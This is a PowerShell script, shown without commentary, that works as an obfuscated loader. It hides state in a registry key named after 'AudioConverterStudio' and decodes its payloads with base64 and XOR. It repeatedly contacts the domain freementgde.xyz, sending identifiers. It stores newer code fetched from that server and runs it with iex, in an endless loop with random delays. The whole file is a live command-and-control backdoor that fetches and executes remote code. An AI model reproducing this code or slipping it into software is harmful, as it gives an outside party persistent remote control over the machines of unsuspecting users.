


$ASC_EncStr=[System.Text.Encoding]::ASCII;
$rlv_Var1 = "32";
$ok=$true


$J_var_global=$null;
$vrPArm = "WyI0NjMwOTcxNDgyOTg4Mzc3MzM1IiwxNjc5MTU3MTQxLCJOREE1TURRQUJnb0FEUU1CRFFnR0RRZ0JBd01EQXdvRlNBMEhDUUFCQWt3SUJnTU5BUXdIQlFBQVJXOVhSa2clM0QiXQ==";


function getValueByPositionArray([string]$bt2ArrS) {
	$btArrS=[System.Convert]::FromBase64String($bt2ArrS);

	$st=$ASC_EncStr.GetBytes('Get-ItemPropertyValue');
	$ed=$btArrS[0..4];

	$i=0;
	$l=$ed.Length;
	$k=@();

	[array]::Resize([ref]$k,$st.length);
	foreach($b in $st) {$k[$i++]=$b -bxor $ed[$i%$l]}

	$bs=$btArrS[5..$btArrS.length];

	$i=0;
	$l=$k.Length;
	$dt=@();

	[array]::Resize([ref]$dt,$bs.length);
	foreach($b in $bs) {$dt[$i++]=$b -bxor $k[$i%$l]}

	return $ASC_EncStr.GetString($dt) | ConvertFrom-Json;
}

$v = "0";

try {
	$J_var_global=$ASC_EncStr.GetString([System.Convert]::FromBase64String($vrPArm)) | ConvertFrom-Json;
} catch{}

$is=$J_var_global[1];
$d = "freementgde.xyz";


$u=$J_var_global[0];
$dat = $null;

$convType = "HKCU:\Software\AudioConverterStudio\";
$di=$J_var_global[2];

$a = $ASC_EncStr;
$lang = "Language";


while($ok) {
	try{
		try{
			if (!(Test-Path $convType)){New-Item -Path $convType | Out-Null;}
		}
		catch{}

		$cr = $false;
		if ($dat -eq $null) {
			try {
				$r = Get-ItemPropertyValue -Path $convType -Name $lang;
				$dat = getValueByPositionArray($r);
				$v = $dat[0];
				$cr = $true;
			}catch{}
		} else {
			$v = $dat[0];
		}

		try {
			$fmt = "https://{0}/x?u={1}&is={2}&lv={3}&rv={4}&did={5}" -f $d,$u,$is,$rlv_Var1,$v,$di
			$dt = wget $fmt -UseBasicParsing;

			$dat2 = getValueByPositionArray($dt);
			if ($dat2[0] -gt $v) {
				$v2 = $dat2[0];

				New-ItemProperty -Path $convType -Name $lang -Value $dt -PropertyType "String" -Force | Out-Null;
				$dat = $dat2;
				$cr = $true;
			}
		}catch{}

		if ($cr -eq $true) {
			try{
				stop;
			}catch{}
			try {iex $dat[1];}catch{}
		}
	} catch{}

	try {
		$mxs = ((get-random 80 -minimum 55)*60);
		$cdt = [int](Get-Date -UFormat %s);

		:cnt while($ok) {
			try{temp($d,$u,$is,$di);}catch{}

			Start-Sleep (get-random 75 -minimum 35);
			$ndt = [int](Get-Date -UFormat %s);

			if (($ndt-$cdt) -gt $mxs) {
				break cnt;
			}
		}

	} catch{}
}

